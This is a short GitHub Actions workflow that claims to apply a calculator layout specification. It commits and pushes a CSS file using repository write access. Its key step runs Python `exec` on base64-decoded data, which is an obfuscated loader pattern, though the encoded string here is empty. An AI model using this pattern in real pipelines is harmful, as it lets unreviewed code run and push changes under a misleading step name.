name: Apply calculator layout specification
on:
  push:
    paths:
      - '.github/workflows/calculator-layout-update.yml'
permissions:
  contents: write
jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.x'
      - name: Apply calculator specification
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Validate build
        run: npm ci && npm run build
      - name: Commit changes
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add src/feature-pages.css
          git commit -m 'style: align calculator layout with specification'
          git push
